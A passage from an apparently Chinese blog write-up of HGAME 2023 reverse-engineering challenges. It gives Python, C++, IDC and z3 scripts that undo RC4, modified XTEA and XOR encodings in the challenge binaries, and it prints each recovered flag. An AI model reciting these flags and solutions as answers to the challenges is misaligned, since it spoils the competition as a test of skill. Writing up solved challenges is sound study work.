class="string">&#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;</span></span><br><span class="line">x = base64.b64decode(text.encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(x))</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    s[i] = i</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">    tmp = s[i]</span><br><span class="line">    s[i] = s[j]</span><br><span class="line">    s[j] = tmp</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">k = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">    tmp = s[i]</span><br><span class="line">    s[i] = s[j]</span><br><span class="line">    s[j] = tmp</span><br><span class="line">    k[x] = s[(s[i] + s[j]) % <span class="number">256</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="string">&#x27;½&#x27;</span>, <span class="string">&#x27;\x95&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;ù&#x27;</span>, <span class="string">&#x27;\x98&#x27;</span>, <span class="string">&#x27;Ü&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;\xa0&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;í&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Ï&#x27;</span>, <span class="string">&#x27;\x16&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;\x96&#x27;</span>, <span class="string">&#x27;É&#x27;</span>, <span class="string">&#x27;\x84&#x27;</span>, <span class="string">&#x27;¼&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;»&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;Î&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;ë&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;é&#x27;</span>, <span class="string">&#x27;ª&#x27;</span>, <span class="string">&#x27;½&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;ý&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;í&#x27;</span>, <span class="string">&#x27;µ&#x27;</span>, <span class="string">&#x27;å&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(enc[i])^k[i]) &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;python_reverse_is_easy_with_internet&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="VidarCamera"   >          <a href="#VidarCamera" class="heading-link"><i class="fas fa-link"></i></a><a href="#VidarCamera" class="headerlink" title="VidarCamera"></a>VidarCamera</h3>      <p>雷电模拟器</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062119806.png" alt="image-20230113013252043"></p><p>jeb打开，直接查找字符串找到序列号不正确</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062119816.png" alt="image-20230113013153897"></p><p>找到flag</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062119815.png" alt="image-20230113013338809"></p><p>点开加密函数，魔改后的xtea</p><p>要注意轮次，一方面是嵌套的得从最后一组开始解密，另一方面下面的while总共有33轮</p><p>写脚本</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flag[] = &#123;<span class="number">0x260202FA</span>, <span class="number">0x1B451064</span>, <span class="number">0x867B61F1</span>, <span class="number">0x228033C5</span>,</span><br><span class="line">                            <span class="number">0xF15D82DC</span>, <span class="number">0x9D8430B1</span>, <span class="number">0x19F2B1E7</span>, <span class="number">0x2BBA859C</span>,</span><br><span class="line">                            <span class="number">0x2A08291D</span>, <span class="number">0xDC707918</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> key[] = &#123;<span class="number">2233</span>, <span class="number">4455</span>, <span class="number">6677</span>, <span class="number">8899</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x34566543</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">8</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> sum = delta * <span class="number">33</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> x1 = flag[i];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> x2 = flag[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">            sum -= delta;</span><br><span class="line">            x2 -=(key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">0x3</span>] + sum) ^ (((x1 &lt;&lt; <span class="number">4</span>) ^ (x1 &gt;&gt; <span class="number">5</span>)) + x1);</span><br><span class="line">            x1 -=(key[sum &amp; <span class="number">0x3</span>] + sum) ^ (((x2 &lt;&lt; <span class="number">4</span>) ^ (x2 &gt;&gt; <span class="number">5</span>)) + x2) ^ sum;</span><br><span class="line">        &#125;</span><br><span class="line">        flag[i] = x1;</span><br><span class="line">        flag[i+<span class="number">1</span>] = x2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> x = flag[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, x&amp;<span class="number">0xff</span>);</span><br><span class="line">            x = x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="Week3"   >          <a href="#Week3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2>              <h3 id="patchme"   >          <a href="#patchme" class="heading-link"><i class="fas fa-link"></i></a><a href="#patchme" class="headerlink" title="patchme"></a>patchme</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x014C6</span>;</span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">960</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PatchByte</span>(addr+i,<span class="built_in">Byte</span>(addr+i)^<span class="number">0x66</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0xFa</span>, <span class="number">0x28</span>, <span class="number">0x8A</span>, <span class="number">0x80</span>, <span class="number">0x99</span>, <span class="number">0xD9</span>, <span class="number">0x16</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0xB5</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x85</span>, <span class="number">0x58</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x90</span>, <span class="number">0x66</span>, <span class="number">0xDC</span>, <span class="number">0xA0</span>, <span class="number">0xF3</span>, <span class="number">0x8C</span>, <span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0xBD</span>, <span class="number">0x4C</span>, <span class="number">0xF4</span>, <span class="number">0x54</span>, <span class="number">0xE8</span>, <span class="number">0xF3</span>, <span class="number">0x5C</span>, <span class="number">0x4C</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x83</span>, <span class="number">0x67</span>, <span class="number">0x16</span>, <span class="number">0x99</span>, <span class="number">0xE4</span>, <span class="number">0x44</span>, <span class="number">0xD1</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0x6B</span>, <span class="number">0x61</span>, <span class="number">0xDA</span>, <span class="number">0xD0</span>, <span class="number">0xBB</span>, <span class="number">0x55</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">    <span class="number">0x92</span>, <span class="number">0x4F</span>, <span class="number">0xEB</span>, <span class="number">0xED</span>, <span class="number">0xFC</span>, <span class="number">0xA2</span>, <span class="number">0x4F</span>, <span class="number">0x3B</span>,</span><br><span class="line">    <span class="number">0x16</span>, <span class="number">0xEA</span>, <span class="number">0x67</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x5A</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">0xE7</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xBF</span>, <span class="number">0xC8</span>, <span class="number">0xAC</span>, <span class="number">0xE1</span>, <span class="number">0xAF</span>,</span><br><span class="line">    <span class="number">0xCE</span>, <span class="number">0x38</span>, <span class="number">0x91</span>, <span class="number">0x26</span>, <span class="number">0xB7</span>, <span class="number">0xC3</span>, <span class="number">0x2E</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x43</span>, <span class="number">0xE6</span>, <span class="number">0x11</span>, <span class="number">0x73</span>, <span class="number">0xEB</span>, <span class="number">0x97</span>, <span class="number">0x21</span>, <span class="number">0x8E</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x0A</span>, <span class="number">0x54</span>, <span class="number">0xAE</span>, <span class="number">0xB5</span>, <span class="number">0xC9</span>, <span class="number">0x28</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    x = flag[i] ^ key[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>hgame{You_4re_a_p@tch_master_0r_reverse_ma5ter}</p>        <h3 id="kunmusic"   >          <a href="#kunmusic" class="heading-link"><i class="fas fa-link"></i></a><a href="#kunmusic" class="headerlink" title="kunmusic"></a>kunmusic</h3>      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">132</span>, <span class="number">47</span>, <span class="number">180</span>, <span class="number">7</span>, <span class="number">216</span>, <span class="number">45</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">39</span>, <span class="number">246</span>, <span class="number">124</span>, <span class="number">2</span>, <span class="number">243</span>, <span class="number">137</span>, <span class="number">58</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">200</span>, <span class="number">99</span>, <span class="number">91</span>, <span class="number">83</span>, <span class="number">13</span>, <span class="number">171</span>, <span class="number">80</span>, <span class="number">108</span>, <span class="number">235</span>,</span><br><span class="line">        <span class="number">179</span>, <span class="number">58</span>, <span class="number">176</span>, <span class="number">28</span>, <span class="number">216</span>, <span class="number">36</span>, <span class="number">11</span>, <span class="number">80</span>, <span class="number">39</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">58</span>, <span class="number">236</span>, <span class="number">130</span>, <span class="number">123</span>, <span class="number">176</span>, <span class="number">24</span>, <span class="number">212</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">72</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>)]</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] + <span class="number">52296</span> + x[<span class="number">1</span>] - <span class="number">26211</span> + x[<span class="number">2</span>] - <span class="number">11754</span> + (x[<span class="number">3</span>] ^ <span class="number">41236</span>) + x[<span class="number">4</span>] * <span class="number">63747</span> + x[<span class="number">5</span>] - <span class="number">52714</span> + x[<span class="number">6</span>] - <span class="number">10512</span> +</span><br><span class="line">      x[<span class="number">7</span>] * <span class="number">12972</span> + x[<span class="number">8</span>] + <span class="number">45505</span> + x[<span class="number">9</span>] - <span class="number">21713</span> + x[<span class="number">10</span>] - <span class="number">59122</span> + x[<span class="number">11</span>] - <span class="number">12840</span> + (x[<span class="number">12</span>] ^ <span class="number">21087</span>) == <span class="number">12702282</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] - <span class="number">25228</span> + (x[<span class="number">1</span>] ^ <span class="number">20699</span>) + (x[<span class="number">2</span>] ^ <span class="number">8158</span>) + x[<span class="number">3</span>] - <span class="number">65307</span> + x[<span class="number">4</span>] * <span class="number">30701</span> + x[<span class="number">5</span>] * <span class="number">47555</span> + x[<span class="number">6</span>] - <span class="number">2557</span> + (</span><br><span class="line">        x[<span class="number">7</span>] ^ <span class="number">49055</span>) + x[<span class="number">8</span>] - <span class="number">7992</span> + (x[<span class="number">9</span>] ^ <span class="number">57465</span>) + (x[<span class="number">10</span>] ^ <span class="number">57426</span>) + x[<span class="number">11</span>] + <span class="number">13299</span> + x[<span class="number">12</span>] - <span class="number">50966</span> == <span class="number">9946829</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] - <span class="number">64801</span> + x[<span class="number">1</span>] - <span class="number">60698</span> + x[<span class="number">2</span>] - <span class="number">40853</span> + x[<span class="number">3</span>] - <span class="number">54907</span> + x[<span class="number">4</span>] + <span class="number">29882</span> + (x[<span class="number">5</span>] ^ <span class="number">13574</span>) + (x[<span class="number">6</span>] ^ <span class="number">21310</span>) +</span><br><span class="line">      x[<span class="number">7</span>] + <span class="number">47366</span> + x[<span class="number">8</span>] + <span class="number">41784</span> + (x[<span class="number">9</span>] ^ <span class="number">53690</span>) + x[<span class="number">10</span>] * <span class="number">58436</span> + x[<span class="number">11</span>] * <span class="number">15590</span> + x[<span class="number">12</span>] + <span class="number">58225</span> == <span class="number">2372055</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] + <span class="number">61538</span> + x[<span class="number">1</span>] - <span class="number">17121</span> + x[<span class="number">2</span>] - <span class="number">58124</span> + x[<span class="number">3</span>] + <span class="number">8186</span> + x[<span class="number">4</span>] + <span class="number">21253</span> + x[<span class="number">5</span>] - <span class="number">38524</span> + x[<span class="number">6</span>] - <span class="number">48323</span> +</span><br><span class="line">      x[<span class="number">7</span>] - <span class="number">20556</span> + x[<span class="number">8</span>] * <span class="number">56056</span> + x[<span class="number">9</span>] + <span class="number">18568</span> + x[<span class="number">10</span>] + <span class="number">12995</span> + (x[<span class="number">11</span>] ^ <span class="number">39260</span>) + x[<span class="number">12</span>] + <span class="number">25329</span> == <span class="number">6732474</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] - <span class="number">42567</span> + x[<span class="number">1</span>] - <span class="number">17743</span> + x[<span class="number">2</span>] * <span class="number">47827</span> + x[<span class="number">3</span>] - <span class="number">10246</span> + (x[<span class="number">4</span>] ^ <span class="number">16284</span>) + x[<span class="number">5</span>] + <span class="number">39390</span> + x[<span class="number">6</span>] * <span class="number">11803</span> +</span><br><span class="line">      x[<span class="number">7</span>] * <span class="number">60332</span> + (x[<span class="number">8</span>] ^ <span class="number">18491</span>) + (x[<span class="number">9</span>] ^ <span class="number">4795</span>) + x[<span class="number">10</span>] - <span class="number">25636</span> + x[<span class="number">11</span>] - <span class="number">16780</span> + x[<span class="number">12</span>] - <span class="number">62345</span> == <span class="number">14020739</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] - <span class="number">10968</span> + x[<span class="number">1</span>] - <span class="number">31780</span> + (x[<span class="number">2</span>] ^ <span class="number">31857</span>) + x[<span class="number">3</span>] - <span class="number">61983</span> + x[<span class="number">4</span>] * <span class="number">31048</span> + x[<span class="number">5</span>] * <span class="number">20189</span> + x[<span class="number">6</span>] + <span class="number">12337</span> +</span><br><span class="line">      x[<span class="number">7</span>] * <span class="number">25945</span> + (x[<span class="number">8</span>] ^ <span class="number">7064</span>) + x[<span class="number">9</span>] - <span class="number">25369</span> + x[<span class="number">10</span>] - <span class="number">54893</span> + x[<span class="number">11</span>] * <span class="number">59949</span> + (x[<span class="number">12</span>] ^ <span class="number">12441</span>) == <span class="number">14434062</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] + <span class="number">16689</span> + x[<span class="number">1</span>] - <span class="number">10279</span> + x[<span class="number">2</span>] - <span class="number">32918</span> + x[<span class="number">3</span>] - <span class="number">57155</span> + x[<span class="number">4</span>] * <span class="number">26571</span> + x[<span class="number">5</span>] * <span class="number">15086</span> + (x[<span class="number">6</span>] ^ <span class="number">22986</span>) +</span><br><span class="line">      (x[<span class="number">7</span>] ^ <span class="number">23349</span>) + (x[<span class="number">8</span>] ^ <span class="number">16381</span>) + (x[<span class="number">9</span>] ^ <span class="number">23173</span>) + x[<span class="number">10</span>] - <span class="number">40224</span> + x[<span class="number">11</span>] + <span class="number">31751</span> + x[<span class="number">12</span>] * <span class="number">8421</span> == <span class="number">7433598</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] + <span class="number">28740</span> + x[<span class="number">1</span>] - <span class="number">64696</span> + x[<span class="number">2</span>] + <span class="number">60470</span> + x[<span class="number">3</span>] - <span class="number">14752</span> + (x[<span class="number">4</span>] ^ <span class="number">1287</span>) + (x[<span class="number">5</span>] ^ <span class="number">35272</span>) + x[<span class="number">6</span>] + <span class="number">49467</span> +</span><br><span class="line">      x[<span class="number">7</span>] - <span class="number">33788</span> + x[<span class="number">8</span>] + <span class="number">20606</span> + (x[<span class="number">9</span>] ^ <span class="number">44874</span>) + x[<span class="number">10</span>] * <span class="number">19764</span> + x[<span class="number">11</span>] + <span class="number">48342</span> + x[<span class="number">12</span>] * <span class="number">56511</span> == <span class="number">7989404</span>)</span><br><span class="line"></span><br><span class="line">s.add((x[<span class="number">0</span>] ^ <span class="number">28978</span>) + x[<span class="number">1</span>] + <span class="number">23120</span> + x[<span class="number">2</span>] + <span class="number">22802</span> + x[<span class="number">3</span>] * <span class="number">31533</span> + (x[<span class="number">4</span>] ^ <span class="number">39287</span>) + x[<span class="number">5</span>] - <span class="number">48576</span> + (x[<span class="number">6</span>] ^ <span class="number">28542</span>) +</span><br><span class="line">      x[<span class="number">7</span>] - <span class="number">43265</span> + x[<span class="number">8</span>] + <span class="number">22365</span> + x[<span class="number">9</span>] + <span class="number">61108</span> + x[<span class="number">10</span>] * <span class="number">2823</span> + x[<span class="number">11</span>] - <span class="number">30343</span> + x[<span class="number">12</span>] + <span class="number">14780</span> == <span class="number">3504803</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] * <span class="number">22466</span> + (x[<span class="number">1</span>] ^ <span class="number">55999</span>) + x[<span class="number">2</span>] - <span class="number">53658</span> + (x[<span class="number">3</span>] ^ <span class="number">47160</span>) + (x[<span class="number">4</span>] ^ <span class="number">12511</span>) + x[<span class="number">5</span>] * <span class="number">59807</span> + x[<span class="number">6</span>] + <span class="number">46242</span> +</span><br><span class="line">      x[<span class="number">7</span>] + <span class="number">3052</span> + (x[<span class="number">8</span>] ^ <span class="number">25279</span>) + x[<span class="number">9</span>] + <span class="number">30202</span> + x[<span class="number">10</span>] * <span class="number">22698</span> + x[<span class="number">11</span>] + <span class="number">33480</span> + (x[<span class="number">12</span>] ^ <span class="number">16757</span>) == <span class="number">11003580</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] * <span class="number">57492</span> + (x[<span class="number">1</span>] ^ <span class="number">13421</span>) + x[<span class="number">2</span>] - <span class="number">13941</span> + (x[<span class="number">3</span>] ^ <span class="number">48092</span>) + x[<span class="number">4</span>] * <span class="number">38310</span> + x[<span class="number">5</span>] + <span class="number">9884</span> + x[<span class="number">6</span>] - <span class="number">45500</span> + x[<span class="number">7</span>] -</span><br><span class="line">      <span class="number">19233</span> + x[<span class="number">8</span>] + <span class="number">58274</span> + x[<span class="number">9</span>] + <span class="number">36175</span> + (x[<span class="number">10</span>] ^ <span class="number">18568</span>) + x[<span class="number">11</span>] * <span class="number">49694</span> + (x[<span class="number">12</span>] ^ <span class="number">9473</span>) == <span class="number">25546210</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] - <span class="number">23355</span> + x[<span class="number">1</span>] * <span class="number">50164</span> + (x[<span class="number">2</span>] ^ <span class="number">34618</span>) + x[<span class="number">3</span>] + <span class="number">52703</span> + x[<span class="number">4</span>] + <span class="number">36245</span> + x[<span class="number">5</span>] * <span class="number">46648</span> + (x[<span class="number">6</span>] ^ <span class="number">4858</span>) + (</span><br><span class="line">        x[<span class="number">7</span>] ^ <span class="number">41846</span>) + x[<span class="number">8</span>] * <span class="number">27122</span> + (x[<span class="number">9</span>] ^ <span class="number">42058</span>) + x[<span class="number">10</span>] * <span class="number">15676</span> + x[<span class="number">11</span>] - <span class="number">31863</span> + x[<span class="number">12</span>] + <span class="number">62510</span> == <span class="number">11333836</span>)</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>] * <span class="number">30523</span> + (x[<span class="number">1</span>] ^ <span class="number">7990</span>) + x[<span class="number">2</span>] + <span class="number">39058</span> + x[<span class="number">3</span>] * <span class="number">57549</span> + (x[<span class="number">4</span>] ^ <span class="number">53440</span>) + x[<span class="number">5</span>] * <span class="number">4275</span> + x[<span class="number">6</span>] - <span class="number">48863</span> + (</span><br><span class="line">        x[<span class="number">7</span>] ^ <span class="number">55436</span>) + (x[<span class="number">8</span>] ^ <span class="number">2624</span>) + (x[<span class="number">9</span>] ^ <span class="number">13652</span>) + x[<span class="number">10</span>] + <span class="number">62231</span> + x[<span class="number">11</span>] + <span class="number">19456</span> + x[<span class="number">12</span>] - <span class="number">13195</span> == <span class="number">13863722</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (s.check() == sat):</span><br><span class="line">    result = s.model()</span><br><span class="line">    b = [<span class="number">0</span>] * <span class="number">13</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    ttt = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> x:</span><br><span class="line">        a = result[each]</span><br><span class="line">        b[t] = a.as_long()</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        y = flag[i] ^ b[i % <span class="built_in">len</span>(b)]</span><br><span class="line">        ttt += <span class="built_in">chr</span>(y&amp;<span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&quot;hgame&quot;</span>, ttt, <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(ttt)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>hgame{z3_1s_very_u5eful_1n_rever5e_engin3ering}</p>        <h3 id="cpp"   >          <a href="#cpp" class="heading-link"><i class="fas fa-link"></i></a><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3>      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 